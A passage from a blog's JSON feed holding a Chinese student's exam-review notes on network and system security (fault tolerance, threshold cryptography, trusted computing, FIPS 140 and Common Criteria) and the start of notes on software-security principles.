src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106163750407.png\" alt=\"image-20230106163750407\" style=\"zoom:25%;\">\n\n\n\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106163924140.png\" alt=\"image-20230106163924140\" style=\"zoom:25%;\">\n\n<p>服务器数量:n</p>\n<p>法定人数,quorum数量,即至少正常的数量:q</p>\n<p>失效的server数量:f</p>\n<p>可用性Availability</p>\n<p>​        任何情况下，总是会有Quorum来配合Client操作，因此n-f &gt;&#x3D; q</p>\n<p>一致性Consistency</p>\n<p>​        读出的结果，是最近一次写入的结果，最差情况下，读出的结果为q-（n-q）</p>\n<p>​        其中至少有2f+1台正确服务器（正确的服务器比失效的多），因此2q-n&gt;&#x3D;2f+1</p>\n<p>​    </p>\n<p>​    n至少是4f+1，q至少是3f+1，n为所有服务器数量，q为Quorum（写入和读出的q一致），f为失效服务器的数量</p>\n<h2 id=\"让你设计一个容错的系统\"><a href=\"#让你设计一个容错的系统\" class=\"headerlink\" title=\"让你设计一个容错的系统???\"></a>让你设计一个容错的系统???</h2><p>针对口头消息，描述n&#x3D;7, m&#x3D;2的BGP协议过程</p>\n<h1 id=\"第十二次课-门限密码学\"><a href=\"#第十二次课-门限密码学\" class=\"headerlink\" title=\"第十二次课: 门限密码学\"></a>第十二次课: 门限密码学</h1><h2 id=\"12-1-密码拆分与门限密码的区别和联系\"><a href=\"#12-1-密码拆分与门限密码的区别和联系\" class=\"headerlink\" title=\"12.1 密码拆分与门限密码的区别和联系\"></a>12.1 密码拆分与门限密码的区别和联系</h2><p>秘密分享和门限密码不一样</p>\n<p>门限密码强调计算过程的拆分,秘密不会完整的出现在内存空间</p>\n<p>秘密分享会合成出来</p>\n<p>都有可生存特性, 门限密码保护密钥,</p>\n<p>一个实体发起或执行的密码操作，分散到多个实体组成的一个群体来执行。基础是秘密分享机制，对共享秘密进行重构时，大于等于门限值个数的实体合作恢复出秘密，对于操作（如签名或加密），可以在不出现共享秘密的情况下合作完成最终结果的生成。</p>\n<p>密码拆分和门限密码都是用于将一个密码分成多个分片，以便达到更高的安全性。但是，它们之间有一些区别：</p>\n<ul>\n<li>原理不同：密码拆分是通过将密码表示成多项式的形式，然后求值在若干个点上，得到若干个值，这些值就是密码的分片。而门限密码是通过对密码进行线性运算得到的。</li>\n<li>运算复杂度不同：密码拆分的运算复杂度为 O(n^2)，其中 n 是求值点的数量。而门限密码的运算复杂度为 O(n)。</li>\n<li>恢复密码所需的贡献者数量不同：密码拆分需要至少 n 个贡献者恢复密码，其中 n 是求值点的数量。而门限密码可以在 t 个贡献者中的任意 t 个贡献者恢复密码。</li>\n</ul>\n<p>密码拆分和门限密码都是用于提高密码的安全性的方法，但是它们的原理、运算复杂度和恢复密码所需的贡献者数量都不同。</p>\n<h2 id=\"12-2-拉格朗日差值秘密拆分方案\"><a href=\"#12-2-拉格朗日差值秘密拆分方案\" class=\"headerlink\" title=\"12.2 拉格朗日差值秘密拆分方案\"></a>12.2 拉格朗日差值秘密拆分方案</h2><p>利用多项式曲线的秘密分享</p>\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106135453954.png\" alt=\"image-20230106135453954\" style=\"zoom:50%;\">\n\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106135537740.png\" alt=\"image-20230106135537740\" style=\"zoom:50%;\">\n\n<h2 id=\"12-3-RSA门限密码实施过程\"><a href=\"#12-3-RSA门限密码实施过程\" class=\"headerlink\" title=\"12.3 RSA门限密码实施过程\"></a>12.3 RSA门限密码实施过程</h2><p>加法的什么什么.. 乘法的就算了</p>\n<p>比如给你来计算怎么拆分</p>\n<h2 id=\"12-4-使用proactive-recovery对抗-mobile-adversary的基本原理\"><a href=\"#12-4-使用proactive-recovery对抗-mobile-adversary的基本原理\" class=\"headerlink\" title=\"12.4 使用proactive recovery对抗 mobile adversary的基本原理\"></a>12.4 使用proactive recovery对抗 mobile adversary的基本原理</h2><p>丢失了份额怎么快速地让影响消失</p>\n<h1 id=\"第十三次课-自重构可信赖与终端安全\"><a href=\"#第十三次课-自重构可信赖与终端安全\" class=\"headerlink\" title=\"第十三次课: 自重构可信赖与终端安全\"></a>第十三次课: 自重构可信赖与终端安全</h1><h2 id=\"13-1-美国提出的改变博弈（游戏）规则安全技术包括哪些？\"><a href=\"#13-1-美国提出的改变博弈（游戏）规则安全技术包括哪些？\" class=\"headerlink\" title=\"13.1 美国提出的改变博弈（游戏）规则安全技术包括哪些？\"></a>13.1 美国提出的改变博弈（游戏）规则安全技术包括哪些？</h2><p>四个安全技术,背景、内核、目标是什么?</p>\n<h2 id=\"13-2-自重构可信赖与其它安全技术相比最大的安全特征是什么，其带来的安全优势又是什么？\"><a href=\"#13-2-自重构可信赖与其它安全技术相比最大的安全特征是什么，其带来的安全优势又是什么？\" class=\"headerlink\" title=\"13.2 自重构可信赖与其它安全技术相比最大的安全特征是什么，其带来的安全优势又是什么？\"></a>13.2 自重构可信赖与其它安全技术相比最大的安全特征是什么，其带来的安全优势又是什么？</h2><p><img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105231732350.png\" alt=\"image-20230105231732350\"></p>\n<h2 id=\"13-3-移动终端TEE技术的5个基本安全特征及其含义。\"><a href=\"#13-3-移动终端TEE技术的5个基本安全特征及其含义。\" class=\"headerlink\" title=\"13.3 移动终端TEE技术的5个基本安全特征及其含义。\"></a>13.3 移动终端TEE技术的5个基本安全特征及其含义。</h2><p>可信执行环境TEE</p>\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105232244371.png\" alt=\"image-20230105232244371\" style=\"zoom: 33%;\">\n\n\n\n<h1 id=\"第十四次课：可信计算\"><a href=\"#第十四次课：可信计算\" class=\"headerlink\" title=\"第十四次课：可信计算\"></a>第十四次课：可信计算</h1><h2 id=\"可信计算的基本功能：公钥认证、完整性度量、证明；\"><a href=\"#可信计算的基本功能：公钥认证、完整性度量、证明；\" class=\"headerlink\" title=\"可信计算的基本功能：公钥认证、完整性度量、证明；\"></a>可信计算的基本功能：公钥认证、完整性度量、证明；</h2><h2 id=\"CRTM和DRTM的概念及区别；\"><a href=\"#CRTM和DRTM的概念及区别；\" class=\"headerlink\" title=\"CRTM和DRTM的概念及区别；\"></a>CRTM和DRTM的概念及区别；</h2><p>DRTM旨在实现信任根的随时随地启动，以及可信启动过程的可重复</p>\n<p><img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106112518731.png\" alt=\"image-20230106112518731\"></p>\n<h2 id=\"TCG软件栈TSS的基本架构和作用；\"><a href=\"#TCG软件栈TSS的基本架构和作用；\" class=\"headerlink\" title=\"TCG软件栈TSS的基本架构和作用；\"></a>TCG软件栈TSS的基本架构和作用；</h2><p>可信支撑软件是操作系统层面安全应用可以调用可信计算平台提供的可信服务接口，从而为用户提供可信服务。<br>TSS（TCG Software Stack）是可信计算平台上TPM的支撑软件。 TSS 的作用主要是为操作系统和应用软件提供使用TPM的接口。<br>目前，TSS主要有TSS 1.2和TSS 2.0两个版本。其中基于TPM 2.0的TSS 2.0是最新的版本。</p>\n<p><img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106112200763.png\" alt=\"image-20230106112200763\"></p>\n<h2 id=\"BIOS如何与TPM模块交互\"><a href=\"#BIOS如何与TPM模块交互\" class=\"headerlink\" title=\"BIOS如何与TPM模块交互\"></a>BIOS如何与TPM模块交互</h2><p><img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106112040751.png\" alt=\"image-20230106112040751\"><img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106112102049.png\" alt=\"image-20230106112102049\"></p>\n<h2 id=\"完整性度量的应用，比如区块链区块头的完整性保护原理等。\"><a href=\"#完整性度量的应用，比如区块链区块头的完整性保护原理等。\" class=\"headerlink\" title=\"完整性度量的应用，比如区块链区块头的完整性保护原理等。\"></a>完整性度量的应用，比如区块链区块头的完整性保护原理等。</h2><p>tpm(可信平台模块):是专门为进行加密计算而创建的硬件。它与处理系统的其余部分在物理上隔离，并且通常是主板上的一个独立 IC。 </p>\n<p>tcg :TCG（Trusted Computing Grounp）架构-即从平台无关角度全局上阐述了可信平台模块TPM（Trusted Platform Module）的架构，功能，主要模块，工作原理，密钥管理方式等。</p>\n<p>tee:是芯片组上的一个区域，其工作方式类似于 TPM，但并未与芯片的其余部分物理隔离。</p>\n<h1 id=\"十五次课\"><a href=\"#十五次课\" class=\"headerlink\" title=\"十五次课\"></a>十五次课</h1><h2 id=\"15-1-信息安全测评体系结构；\"><a href=\"#15-1-信息安全测评体系结构；\" class=\"headerlink\" title=\"15.1 信息安全测评体系结构；\"></a>15.1 信息安全测评体系结构；</h2><img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106114021512.png\" alt=\"image-20230106114021512\" style=\"zoom:50%;\">\n\n<p>​\t\tCMVP最底层: 密码模块的验证体系,  符合FIPS认证体系标准(通过这个标准来检测是否符合标准)</p>\n<p>​\t\t在这基础上做一些安全功能: 基于密码模块的协议级功能 protocols</p>\n<p>​\t\t执行安全功能的产品,比如什么浏览器,防火墙什么的,按照CC标准来做 安全产品</p>\n<p>​\t\t800-37 53 系统级安全,类似于我国的等保</p>\n<p>​\t\t再通过C&amp;A 认证和认可来保证整个IT的安全</p>\n<h2 id=\"15-2-密码技术在信息安全和测评体系结构中的作用；\"><a href=\"#15-2-密码技术在信息安全和测评体系结构中的作用；\" class=\"headerlink\" title=\"15.2 密码技术在信息安全和测评体系结构中的作用；\"></a>15.2 密码技术在信息安全和测评体系结构中的作用；</h2><h2 id=\"15-3-FIPS-密码模块测评的基本概念，密码模块的-4-个级别、-5-个类别等\"><a href=\"#15-3-FIPS-密码模块测评的基本概念，密码模块的-4-个级别、-5-个类别等\" class=\"headerlink\" title=\"15.3 FIPS 密码模块测评的基本概念，密码模块的 4 个级别、 5 个类别等\"></a>15.3 FIPS 密码模块测评的基本概念，密码模块的 4 个级别、 5 个类别等</h2><p>FIPS 140分为两部分：CAVP和CMVP。其中CAVP为 有FIPS-approved或NIST-recommended的密码算法以 及它们的组件进行验证，且算法通过CAVP验证是整个模块通过CMVP的前置条件。CMVP按照FIPS140标准进行模块检测。</p>\n<h3 id=\"5种类型，也称密码模块形态：\"><a href=\"#5种类型，也称密码模块形态：\" class=\"headerlink\" title=\"5种类型，也称密码模块形态：\"></a>5种类型，也称密码模块形态：</h3><p>· 硬件密码模块：密码边界规定为硬件边线。在硬件边界内可以包含固件和&#x2F;或 软件，其中还可以包括操作系统。 </p>\n<p>· 软件密码模块：密码边界为执行在可修改的运行环境中的纯软件部件（可以是 一个或多个软件部件）和数据组件。软件密码模块的运行环境所包含的计算 平台和操作系统，在定义的密码边界之外。</p>\n<p>· 固件密码模块：密码边界为执行在受限的或不可修改的运行环境中的纯固件 部件划定界线。固件密码模块的运行环境所包含的计算平台和操作系统，在定义的密码边界之外，但是与固件模块明确绑定。受限运行环境指允许受控更 改的软件或者固件模块,如 Java 卡中的Java 虚拟机</p>\n<p>· 混合软件模块：密码边界为软件部件和不相交的硬件部件（即软件部件不在 硬件模块边界中）的集合划定界线。软件运行的环境所包含的计算平台和操作 系统，在定义的混合软件模块边界之外。</p>\n<p>· 混合固件模块：密码边界为固件部件和不相交的硬件部件（即固件部件不在 硬件模块边界中）的合成划定界线。固件运行的环境所包含的计算平台和操作系统，在定义的混合固件模块边界之外，但是与混合固件模块明确绑定。 </p>\n<h3 id=\"4个级别（硬件4级，软件直观上只有2级）：\"><a href=\"#4个级别（硬件4级，软件直观上只有2级）：\" class=\"headerlink\" title=\"4个级别（硬件4级，软件直观上只有2级）：\"></a>4个级别（硬件4级，软件直观上只有2级）：</h3><p>· 1级：普通的密码产品+自测试</p>\n<p>· 2级：1级的产品+防拆测封条+（明确的角色鉴别）</p>\n<p>· 3级：2级的产品+拆除响应+EFP&#x2F;EFT+可信信道+非入侵式 安全</p>\n<p>· 4级：3级的产品+响应封套  </p>\n<p> 测试针对每一个域的安全要求进行，最后针对各个域的评级中获得的最低评级作为整体评级，要求如下：</p>\n<p>1.在每一个域中独立地评级</p>\n<p>2.反映了模块能满足那个域中所有要求的最大级别</p>\n<p>3.除“运行环境”（不适用于硬件密码模块）、“ 物理安全”（不适用于软件密码模块）、“其他 攻击的缓解”等3个安全域外，其它的安全域都 是必选检测项目</p>\n<p>4.不能只选部分安全域做检测。</p>\n<p>5.如果一个域没有提供不同安全级别的要求，则评 级与模块整体安全级别相当  </p>\n<p>最后针对各个域的评级中获得的最低评级作为整体评级。</p>\n<h2 id=\"15-4-CC-检测的基本概念，-包括-SFR、-SAR、-EAL-等；-ST-和-PP-的区别和联系，\"><a href=\"#15-4-CC-检测的基本概念，-包括-SFR、-SAR、-EAL-等；-ST-和-PP-的区别和联系，\" class=\"headerlink\" title=\"15.4 CC 检测的基本概念， 包括 SFR、 SAR、 EAL 等； ST 和 PP 的区别和联系，\"></a>15.4 CC 检测的基本概念， 包括 SFR、 SAR、 EAL 等； ST 和 PP 的区别和联系，</h2><p>CC是通用评估准则，是描述产品信息安全要求的通用结构和语言，含有标准化的信息安全要求组件和报的目录。CC用于开发保护轮廓（PP）和安全目标（ST），即特定产品的信息安全要求和规范，针对已知的信息安全要求评估产品和系统。</p>\n<ul>\n<li><p>其中安全功能要求（SFR）用于定义安全信息产品的安全功能，描述信息系产品提供的安全服务的要求。</p>\n</li>\n<li><p>安全保障要求（SAR）用于确保信息产品的安全功能可以被有保障地实施。</p>\n</li>\n<li><p>EAL是评估保证级，随着等级提升，安全保障的要求从少到多、由松到紧递增，每个评估保障级都是将安全保障要求的细节按一定方式搭配并固定下来。</p>\n</li>\n<li><p>ST是 对某个特定的评估目标TOE提出的要其 满足的安全功能要求（Security Functional Requirements）和安全保障要求（Security Assurance Requirements）。</p>\n</li>\n<li><p>保护轮廓PP是对某一类产品提出的安全功能和安全保 障要求。</p>\n</li>\n</ul>\n<p>ST相当于产品实现方案，与实现相关，作者可能是信息安全产品厂商、开发者或者集成商。PP相当于产品标准，与实现无关（多个具体实现可能满足同一个PP要求），描述用户对这类产品的安全要求，作者可能是信息产品的用户或厂商。</p>\n<h1 id=\"历史考题-根据学长学姐回忆\"><a href=\"#历史考题-根据学长学姐回忆\" class=\"headerlink\" title=\"历史考题(根据学长学姐回忆)\"></a>历史考题(根据学长学姐回忆)</h1><h2 id=\"状态检测防火墙的原理\"><a href=\"#状态检测防火墙的原理\" class=\"headerlink\" title=\"状态检测防火墙的原理\"></a>状态检测防火墙的原理</h2><p>通过对连接的跟踪功能,实现对数据包状态监测,从而进行过滤,</p>\n<p>包过滤防火墙:只检查报头</p>\n<p>状态检测防火墙:检查报头+建立连接状态表</p>\n<p>应用级网关防火墙:检查报头 + 检查数据</p>\n<p>代理服务器型防火墙:</p>\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106115525824.png\" alt=\"image-20230106115525824\" style=\"zoom:25%;\">\n\n<h2 id=\"异常检测和误用检测的区别\"><a href=\"#异常检测和误用检测的区别\" class=\"headerlink\" title=\"异常检测和误用检测的区别\"></a>异常检测和误用检测的区别</h2><p>异常检测是建立用户正常的一个行为模式库,不在这里面的判定为异常的行为</p>\n<p>误用检测是…</p>\n<p>误用检测 的新特征的发现过程和它的运行(使用已有特征进行检测)是相互独立的,</p>\n<p>而异常检测的模式库更新通常是在IDS中完成,即一边运行,一边更新</p>\n<h2 id=\"IPSEC和ssl的区别\"><a href=\"#IPSEC和ssl的区别\" class=\"headerlink\" title=\"IPSEC和ssl的区别\"></a>IPSEC和ssl的区别</h2><p><a href=\"https://m.yisu.com/ask/3162.html\">https://m.yisu.com/ask/3162.html</a></p>\n<h2 id=\"应急计划和连续性计划的区别。\"><a href=\"#应急计划和连续性计划的区别。\" class=\"headerlink\" title=\"应急计划和连续性计划的区别。\"></a>应急计划和连续性计划的区别。</h2><h2 id=\"APT攻击的影响。\"><a href=\"#APT攻击的影响。\" class=\"headerlink\" title=\"APT攻击的影响。\"></a>APT攻击的影响。</h2><h2 id=\"CC准则中st和pp的区别。\"><a href=\"#CC准则中st和pp的区别。\" class=\"headerlink\" title=\"CC准则中st和pp的区别。\"></a>CC准则中st和pp的区别。</h2><h2 id=\"一个大秘密K由两个秘密s和m组成，两个子秘密不可以暴露，分发给n个人如何分发。\"><a href=\"#一个大秘密K由两个秘密s和m组成，两个子秘密不可以暴露，分发给n个人如何分发。\" class=\"headerlink\" title=\"一个大秘密K由两个秘密s和m组成，两个子秘密不可以暴露，分发给n个人如何分发。\"></a>一个大秘密K由两个秘密s和m组成，两个子秘密不可以暴露，分发给n个人如何分发。</h2><h2 id=\"不可以用ocsl和什么（记不清楚了），使用rsa门限算法，和秘密分享技术。设计一个服务器撤销证书之后，用户立刻\"><a href=\"#不可以用ocsl和什么（记不清楚了），使用rsa门限算法，和秘密分享技术。设计一个服务器撤销证书之后，用户立刻\" class=\"headerlink\" title=\"不可以用ocsl和什么（记不清楚了），使用rsa门限算法，和秘密分享技术。设计一个服务器撤销证书之后，用户立刻\"></a>不可以用ocsl和什么（记不清楚了），使用rsa门限算法，和秘密分享技术。设计一个服务器撤销证书之后，用户立刻</h2><p>不可以进行签名。描述其具体过程。</p>\n<h1 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h1><p><strong>假设A和B均拥有由可信第三方C<strong><strong>A</strong></strong>签发的证书Cer<strong><strong>A</strong></strong>和Cer<strong><strong>B</strong></strong>，以及可信第三方C<strong><strong>A</strong></strong>的根证书。若A想要与B进行双向身份鉴别，并进行加密通信，请详细描述A、B完成上述需求所需的步骤，以R<strong><strong>SA</strong></strong>算法为例。</strong></p>\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106133209217.png\" alt=\"image-20230106133209217\" style=\"zoom:25%;\">\n\n<p>1.A给B发送client hello,带有随机数、支持的协议版本、支持的算法列表</p>\n<p>2.B给A发送server hello,带有随机数,选定协议版本和算法(RSA)</p>\n<p>3.B给A发送B的证书,含有RSA公钥</p>\n<p>4.A通过CA根证书验证B的证书</p>\n<p>5.验证通过后A选定48字节随机数,用B的证书公钥加密后发给B</p>\n<p>6.A发送自己的证书给B</p>\n<p>7.B通过CA根证书验证A的证书</p>\n<p>8.双方计算通信需要的密钥等,开始加密通信</p>\n<p>9.A通知B启用协商好的算法</p>\n<p>10.A结束</p>\n<p>11.B通知A启用协商好的算法</p>\n<p>12.B结束</p>\n<h2 id=\"请调研和分析目前PMI-Privilege-Management-Infrastructure-没有大规模使用的原因\"><a href=\"#请调研和分析目前PMI-Privilege-Management-Infrastructure-没有大规模使用的原因\" class=\"headerlink\" title=\"请调研和分析目前PMI(Privilege Management Infrastructure)没有大规模使用的原因\"></a>请调研和分析目前PMI(Privilege Management Infrastructure)没有大规模使用的原因</h2><p>PMI（Privilege Management Infrastructure）是一种用于管理计算机系统中用户权限的基础设施。它可以帮助组织控制哪些用户可以执行哪些操作，从而提高系统的安全性。但是，目前 PMI 还没有得到大规模使用的原因是：</p>\n<ol>\n<li>实施较为复杂：PMI 需要在计算机系统中部署多个软件组件，这需要较高的技术水平和较长的时间。</li>\n<li>实施成本较高：实施 PMI 需要购买软件和硬件，以及训练员工，这会带来较高的成本。</li>\n<li>维护较为困难：PMI 的软件组件繁多，维护起来较为困难。</li>\n<li>缺乏普及性：PMI 目前并没有得到广泛的接受和使用，因此组织可能比较担心风险。</li>\n</ol>\n<p>总之，PMI 还没有得到大规模使用的原因是实施较为复杂、实施成本较高、维护较为困难和缺乏普及性等。</p>\n",
            "tags": [
                "研究生课程"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/",
            "url": "https://tangzichengcc.github.io/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/",
            "title": "ucas-软件安全原理-复习",
            "date_published": "2022-12-27T06:12:08.000Z",
            "content_html": "<p>根据*的数量标识重要程度,最高级 ***</p>\n<h1 id=\"一、软件安全\"><a href=\"#一、软件安全\" class=\"headerlink\" title=\"一、软件安全\"></a>一、软件安全</h1><h2 id=\"重新认识软件\"><a href=\"#重新认识软件\" class=\"headerlink\" title=\"重新认识软件*\"></a>重新认识软件*</h2><p>软件的重要性:软件是构建网络空间的“水泥”</p>\n<p>软件的最本质特性:可编程(programmable)</p>\n<p>软件是不负责任的产品           为什么??()</p>\n<h2 id=\"软件和程序的定义\"><a href=\"#软件和程序的定义\" class=\"headerlink\" title=\"软件和程序的定义\"></a>软件和程序的定义</h2><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230102230652126.png\" alt=\"image-20230102230652126\" style=\"zoom:33%;\">\n\n<h3 id=\"软件\"><a href=\"#软件\" class=\"headerlink\" title=\"软件\"></a>软件</h3><p>是用户与硬件之间的接口,用户通过软件与计算机交流</p>\n<p>软件包括 程序、数据和文档</p>\n<h3 id=\"程序\"><a href=\"#程序\" class=\"headerlink\" title=\"程序\"></a>程序</h3><p>是一组通过计算机执行,以完成特定任务的指令</p>\n<p>程序包括以下类型: 源程序、汇编代码、目标程序</p>\n<h2 id=\"软件、网络空间安全发展历程\"><a href=\"#软件、网络空间安全发展历程\" class=\"headerlink\" title=\"软件、网络空间安全发展历程\"></a>软件、网络空间安全发展历程</h2><p>这是一条线,完整的发展过程,未来做研究等,也可以按照类似的方法</p>\n<p>编程语言、操作系统、专用软件的发展路线,反映了这些年软件技术交叠发展的态势</p>\n<h2 id=\"什么是软件安全\"><a href=\"#什么是软件安全\" class=\"headerlink\" title=\"什么是软件安全 ***\"></a>什么是软件安全 ***</h2><p>软件安全是网络空间安全的重要部分. 主要研究软件的防御机制与技术,软件脆弱性分析与漏洞利用技术,网络系统环境中软件的攻防博弈,以及软件安全性的工程化保障方法.</p>\n<img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221227142004483.png\" alt=\"image-20221227142004483\" style=\"zoom: 25%;\">\n\n<h2 id=\"白帽与黑帽\"><a href=\"#白帽与黑帽\" class=\"headerlink\" title=\"白帽与黑帽 *\"></a>白帽与黑帽 *</h2><p>黑帽子(破坏方法):与攻击、攻击程序和破解软件相关的方法</p>\n<p>白帽子(建设方法):与设计、防御和功能性相关的方法</p>\n<h2 id=\"软件安全三部曲\"><a href=\"#软件安全三部曲\" class=\"headerlink\" title=\"软件安全三部曲 ***\"></a>软件安全三部曲 ***</h2><p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228151447620.png\" alt=\"image-20221228151447620\"></p>\n<p>软件安全防御:从”白帽“的视角,研究软件的各类防御机制</p>\n<p>软件安全分析和利用:从”黑帽“的视角,研究软件存在的各种安全脆弱性问题以及高效发现及利用方法</p>\n<p>安全的软件开发:确保软件安全的工程化方法,BSI是其核心思想,需要贯彻始终</p>\n<h2 id=\"主席网络安全观\"><a href=\"#主席网络安全观\" class=\"headerlink\" title=\"主席网络安全观 **\"></a>主席网络安全观 **</h2><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228151647672.png\" alt=\"image-20221228151647672\" style=\"zoom:25%;\">\n\n<ul>\n<li>一、关于网络安全的定位</li>\n</ul>\n<p>​\t1.没有网络安全就没有国家安全</p>\n<p>​\t2.网络安全为人民,网络安全靠人民</p>\n<ul>\n<li>二、关于安全和发展的关系</li>\n</ul>\n<p>​\t1.网络安全和信息化是一体之两翼,驱动之双轮</p>\n<p>​\t2.以安全保发展,以发展促安全</p>\n<ul>\n<li>三、关于网络安全法治</li>\n</ul>\n<p>​\t1.互联网不是法外之地</p>\n<p>​\t2.坚持依法治网、依法办网、依法上网</p>\n<ul>\n<li>四、关于网络空间技术能力</li>\n</ul>\n<p>​\t1.大力发展核心技术,加强关键基础信息设施安全保障</p>\n<p>​\t2.最关键最核心的技术要立足自主创新、自立自强</p>\n<ul>\n<li>五、关于网络安全人才建设</li>\n</ul>\n<p>​\t1.网络空间的竞争,归根结底是人才的竞争</p>\n<p>​\t2.形成人才培养,技术创新,产业发展的良性生态</p>\n<ul>\n<li>六、关于互联网国际治理</li>\n</ul>\n<p>​\t1.尊重网络主权,维护和平安全,促进开放合作,构建良好秩序</p>\n<p>​\t2.构建网络空间安全命运共同体</p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230102233025872.png\" alt=\"image-20230102233025872\"></p>\n<h2 id=\"《网络信息安全的真相》\"><a href=\"#《网络信息安全的真相》\" class=\"headerlink\" title=\"《网络信息安全的真相》**\"></a>《网络信息安全的真相》**</h2><ul>\n<li><p>木桶原理(国外更倾向于叫链条原理?): 安全防御系统的强度是由其最薄弱环节的强度决定的</p>\n</li>\n<li><p>PDR模型:安全防御是一个过程,包含防护-检测-响应等基本环节</p>\n</li>\n<li><p>没有银弹:没有一个实际系统是无懈可击的,没有一项安全技术可以包治百病</p>\n</li>\n</ul>\n<h2 id=\"软件安全与网络安全的关系\"><a href=\"#软件安全与网络安全的关系\" class=\"headerlink\" title=\"软件安全与网络安全的关系 **\"></a>软件安全与网络安全的关系 **</h2><ul>\n<li><p>网络空间各种各样部件的大多数功能都是通过软件实现的,因此软件漏洞将直接影响网络空间的安全</p>\n</li>\n<li><p>围绕软件漏洞,无论是攻击还是防御,实际上都是在网络层面展开对抗</p>\n</li>\n</ul>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228152029114.png\" alt=\"image-20221228152029114\"></p>\n<h2 id=\"软件安全研究视角\"><a href=\"#软件安全研究视角\" class=\"headerlink\" title=\"软件安全研究视角\"></a>软件安全研究视角</h2><p>源代码 汇编代码 机器码</p>\n<p>要贯穿于这几个层次来综合分析,才会更好!</p>\n<ul>\n<li>理解程序是软件安全攻防的基本功</li>\n<li>掌握程序的生成与运行原理是理解程序的前提</li>\n</ul>\n<h1 id=\"二、逆向工程\"><a href=\"#二、逆向工程\" class=\"headerlink\" title=\"二、逆向工程\"></a>二、逆向工程</h1><h2 id=\"基础概念-定义\"><a href=\"#基础概念-定义\" class=\"headerlink\" title=\"基础概念 定义 *\"></a>基础概念 定义 *</h2><p>逆向工程:通过观察系统及其行为,建立其结构蓝图,以弄清其运行规律的过程</p>\n<p>软件逆向工程: 针对软件的逆向工程</p>\n<p>目标软件&#x2F;程序: 运用逆向工程进行分析的特定软件或程序</p>\n<h2 id=\"程序编译过程\"><a href=\"#程序编译过程\" class=\"headerlink\" title=\"程序编译过程\"></a>程序编译过程</h2><p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230102233655971.png\" alt=\"image-20230102233655971\"></p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228152616035.png\" alt=\"image-20221228152616035\"></p>\n<h2 id=\"程序的运行过程\"><a href=\"#程序的运行过程\" class=\"headerlink\" title=\"程序的运行过程 *\"></a>程序的运行过程 *</h2><p>栈桢中存放的东西</p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230102233924030.png\" alt=\"image-20230102233924030\"></p>\n<p><img 